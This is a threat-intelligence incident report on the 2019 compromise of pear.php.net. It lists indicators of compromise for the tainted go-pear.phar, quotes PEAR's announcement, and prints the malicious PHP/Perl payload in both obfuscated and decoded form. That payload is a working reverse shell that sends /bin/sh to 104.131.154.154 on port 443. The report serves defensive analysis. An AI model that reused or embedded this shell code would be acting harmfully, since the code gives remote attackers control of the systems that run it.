# Threat Report: 2019-01-21: Incident - pear.php.net - compromised and delivering malicious package


## Key Intelligence
* Date: 2019-01-21
* Threat Level: 3 (Low)
* Tags: type:OSINT, osint:lifetime="perpetual", osint:certainty="50", tlp:white, circl:incident-classification="system-compromise", ecsirt:intrusions="compromised", europol-incident:information-security="unauthorized-access", europol-incident:information-security="unauthorized-modification", veris:security_incident="Confirmed"

---

## Indicators of Compromise (IOCs)
### Artifacts dropped
* md5: <md5> — md5sum of the infected file

### Network activity
* ip-dst: 104.131.154.154

### Payload delivery
* text: ${"\x47\x4cO\x42\x41\x4cS"}["ki\x72\x69\x68\x71\x68"]="st\x72";${${"GLOBA\x4c\x53"}["k\x69ri\x68\x71\x68"]}="\x75\x73\x65\x20\x53\x6f\x63\x6b\x65\x74\x3b\x0a\x70\x72\x69\x6e\x74\x20\x22\x73\x74\x61\x72\x74\x65\x64\x22\x3b\x0a\x24\x68\x6f\x73\x74\x20\x3d\x20\x22\x31\x30\x34\x2e\x31\x33\x31\x2e\x31\x35\x34\x2e\x31\x35\x34\x22\x3b\x0a\x24\x70\x6f\x72\x74\x20\x3d\x20\x34\x34\x33\x3b\x0a\x24\x70\x72\x6f\x74\x6f\x20\x3d\x20\x67\x65\x74\x70\x72\x6f\x74\x6f\x62\x79\x6e\x61\x6d\x65\x28\x22\x74\x63\x70\x22\x29\x20\x7c\x7c\x20\x65\x78\x69\x74\x28\x29\x3b\x0a\x73\x6f\x63\x6b\x65\x74\x28\x53\x45\x52\x56\x45\x52\x2c\x20\x50\x46\x5f\x49\x4e\x45\x54\x2c\x20\x53\x4f\x43\x4b\x5f\x53\x54\x52\x45\x41\x4d\x2c\x20\x24\x70\x72\x6f\x74\x6f\x29\x20\x7c\x7c\x20\x65\x78\x69\x74\x28\x29\x3b\x0a\x6d\x79\x20\x24\x74\x61\x72\x67\x65\x74\x20\x3d\x20\x69\x6e\x65\x74\x5f\x61\x74\x6f\x6e\x28\x24\x68\x6f\x73\x74\x29\x3b\x0a\x69\x66\x20\x28\x21\x63\x6f\x6e\x6e\x65\x63\x74\x28\x53\x45\x52\x56\x45\x52\x2c\x20\x70\x61\x63\x6b\x20\x22\x53\x6e\x41\x34\x78\x38\x22\x2c\x20\x32\x2c\x20\x24\x70\x6f\x72\x74\x2c\x20\x24\x74\x61\x72\x67\x65\x74\x29\x29\x20\x7b\x0a\x20\x20\x70\x72\x69\x6e\x74\x20\x22\x6e\x6f\x74\x20\x63\x6f\x6e\x6e\x65\x63\x74\x65\x64\x22\x3b\x0a\x20\x20\x65\x78\x69\x74\x28\x29\x3b\x0a\x7d\x0a\x69\x66\x20\x28\x21\x66\x6f\x72\x6b\x28\x20\x29\x29\x20\x7b\x0a\x20\x20\x70\x72\x69\x6e\x74\x20\x22\x63\x68\x69\x6c\x64\x22\x3b\x0a\x20\x20\x6f\x70\x65\x6e\x28\x53\x54\x44\x49\x4e\x2c\x22\x3e\x26\x53\x45\x52\x56\x45\x52\x22\x29\x3b\x0a\x20\x20\x6f\x70\x65\x6e\x28\x53\x54\x44\x4f\x55\x54\x2c\x22\x3e\x26\x53\x45\x52\x56\x45\x52\x22\x29\x3b\x0a\x20\x20\x6f\x70\x65\x6e\x28\x53\x54\x44\x45\x52\x52\x2c\x22\x3e\x26\x53\x45\x52\x56\x45\x52\x22\x29\x3b\x0a\x20\x20\x70\x72\x69\x6e\x74\x28\x22\x65\x78\x65\x63\x22\x29\x3b\x0a\x20\x20\x65\x78\x65\x63\x20\x7b\x22\x2f\x62\x69\x6e\x2f\x73\x68\x22\x7d\x20\x22\x2d\x62\x61\x73\x68\x22\x20\x2e\x20\x22\\0\x22\x20\x78\x20\x34\x3b\x0a\x20\x20\x70\x72\x69\x6e\x74\x28\x22\x65\x78\x69\x74\x22\x29\x3b\x0a\x20\x20\x65\x78\x69\x74\x28\x30\x29\x3b\x0a\x7d";@exec("p\x65\x72\x6c -e \x27$str\x27 \x3e /dev/n\x75ll\x202\x3e/de\x76/\x6e\x75\x6c\x6c");

## Objects
### microblog — Microblog post like a Twitter tweet or a post on a Facebook wall.
* [Other] text: A security breach has been found on the http://pear.php.net  webserver, with a tainted go-pear.phar discovered. The PEAR website itself has been disabled until a known clean site can be rebuilt. A more detailed announcement will be on the PEAR Blog once it's back online.
* [Other] text: Twitter
* [External analysis] link: https://twitter.com/pear/status/1086634389465956352
* [Other] text: pear

### file — File object describing a file with meta-information
* [Payload delivery] malware-sample: f74c4406c53e5b0187b8b1cfeb5b74f88ac9294acca29bdba8bd11371b2245e8|1e26d9dd3110af79a9595f1a77a82de7
* [Payload delivery] filename: f74c4406c53e5b0187b8b1cfeb5b74f88ac9294acca29bdba8bd11371b2245e8
* [Payload delivery] md5: <md5>
* [Payload delivery] sha1: <sha1>
* [Payload delivery] sha256: <sha256>
* [Other] size-in-bytes: 3604833

### script — Object describing a computer program written to be run in a special run-time environment. The script or shell script can be used for malicious activities but also as support tools for threat analysts.
* [Other] text: ${"GLOBALS"}["kirihqh"]="str";${${"GLOBALS"}["kirihqh"]}="use Socket;
print "started";
$host = "104.131.154.154";
$port = 443;
$proto = getprotobyname("tcp") || 
socket(SERVER, PF_INET, SOCK_STREAM, $proto) || 
my $target = inet_aton($host);
if (!connect(SERVER, pack "SnA4x8", 2, $port, $target)) {
  print "not connected";
  
}
if (!fork( )) {
  print "child";
  open(STDIN,">&SERVER");
  open(STDOUT,">&SERVER");
  open(STDERR,">&SERVER");
  print("exec");
  exec {"/bin/sh"} "-bash\\0" x 4;
  print("exit");
  
}";@exec("perl -e '$str' > /dev/null 2>/dev/null");
* [Other] text: PHP
* [Other] text: Malicious
